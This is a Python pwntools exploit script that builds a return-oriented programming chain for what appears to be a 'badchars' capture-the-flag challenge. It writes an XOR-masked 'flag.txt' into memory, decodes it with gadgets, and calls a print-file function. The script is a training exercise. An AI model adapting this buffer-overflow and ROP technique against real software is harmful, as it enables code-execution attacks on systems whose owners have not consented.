#!/bin/python

from pwn import *
import codecs

file = b"fl!'nt8t"

offset = 40
base = 0x00400000
libcBase = 0x7ffff7a19000
badcharLib = 0x7ffff7c00000

printFile = p64(badcharLib + 0xa07 );
writableAddress = p64(badcharLib + 0x00201060);

exitAddress = p64(badcharLib + 0x202050);

ret = p64(libcBase + 0x0231d6)

mov = p64(libcBase + 0xa3050) # mov [rdi[, rdx;
popRDI = p64(libcBase + 0x23835)
popRDXRBX = p64(libcBase + 0x82849)
xorAddtess = p64(libcBase + 0x000000000017ae66) #xor    BYTE PTR [rbp+0x21],cl
poprbp = p64(libcBase + 0x0000000000023730) #pop rbp; ret
xor_rdi_dh = p64(base+0x400629)
xor_edi_rcx = p64(libcBase+0x12e21f) # xor edi, dword ptr [rcx]; ret 0x8e0f;
pop_rsi = p64(libcBase + 0x0000000000025151)
push_rdi = p64(libcBase + 0x026085)
mov_rsi_rdi = p64(libcBase + 0x122771)

mov_eax_edi = p64(libcBase + 0x4eda1);
mov_rcx_eax = p64(libcBase + 0x762d7);
add_esp = p64(libcBase + 0x3e3f8);


xor_rax_cl = p64(libcBase+0x000000000004750e) # xor byte ptr [rax - 0x7d], cl; ret; RDX
popRAX = p64(libcBase + 0x3c3d3)
poprcx = p64(libcBase + 0x9d2a3)

newWritableAddress =  (badcharLib + 0x00301008)   #base + (0x00601008 ^ 0x40404040);
addressToWrite = ((badcharLib  + 0x00301008) ^ 0x4040404040404040 )

writableNextAddress = p64(badcharLib + (0x00201060+2) + 0x7d)
writableNextAddress2 = p64(badcharLib + (0x00201060+3) + 0x7d)
writableNextAddress3 = p64(badcharLib + (0x00201060+4) + 0x7d)
writableNextAddress4 = p64(badcharLib + (0x00201060+6) + 0x7d)


rop = b"B"*offset

def xor64(addr):
	rop = b""
	for i in range(0,4):
		rop += popRAX
		rop += p64(addr +  0x7d)
		rop += poprcx
		rop += codecs.decode('4000000000000000', 'hex_codec')
		rop += xor_rax_cl
		addr += 1
	return rop;


#This will write flag.txt into the address 0x601028
rop += popRDI
rop += writableAddress
rop += popRDXRBX
rop += file
rop += file
rop += mov

rop += popRAX
rop += writableNextAddress
rop += poprcx
rop += codecs.decode('4000000000000000', 'hex_codec')
rop += xor_rax_cl

rop += popRAX
rop += writableNextAddress2
rop += poprcx
rop += codecs.decode('4000000000000000', 'hex_codec')
rop += xor_rax_cl

rop += popRAX
rop += writableNextAddress3
rop += poprcx
rop += codecs.decode('4000000000000000', 'hex_codec')
rop += xor_rax_cl

rop += popRAX
rop += writableNextAddress4
rop += poprcx
rop += codecs.decode('4000000000000000', 'hex_codec')
rop += xor_rax_cl

rop += popRDI
rop += writableAddress
rop += printFile

rop += popRDI
rop += codecs.decode('1000000000000000', 'hex_codec')
rop += exitAddress

#rop += popRDI
#rop += p64(newWritableAddress)
#rop += popRDXRBX
#rop += file
#rop += file
#rop += mov

#rop += xor64(newWritableAddress)

#rop += codecs.decode('0000000000000001', 'hex_codec')
#rop += popRDI
#rop += writableGOT
#rop += popRDXRBX
#rop += exitAddress
#rop += exitAddress
#rop += mov

with open ('data', 'wb') as f:
	f.write(rop)


